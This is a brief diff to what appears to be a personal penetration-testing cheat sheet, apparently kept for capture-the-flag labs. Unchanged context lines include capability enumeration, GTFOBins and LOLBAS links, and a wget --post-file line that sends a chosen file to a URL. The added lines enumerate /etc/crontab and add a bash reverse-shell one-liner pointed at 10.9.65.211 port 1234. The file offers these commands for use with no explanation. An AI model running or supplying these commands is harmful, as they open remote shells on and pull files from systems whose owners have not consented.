@@ -55,7 +55,11 @@ getcap -r / 2>/dev/null
 
 ```
 
+```
+/etc/crontab
 
+cat /etc/crontab
+```
 
 https://gtfobins.github.io/
 https://lolbas-project.github.io/
@@ -103,3 +107,7 @@ LFILE=file_to_send
 wget --post-file=$LFILE $URL
 ```
 
+# Reverse Shell
+```
+bash -i >& /dev/tcp/10.9.65.211/1234 0>&1
+```
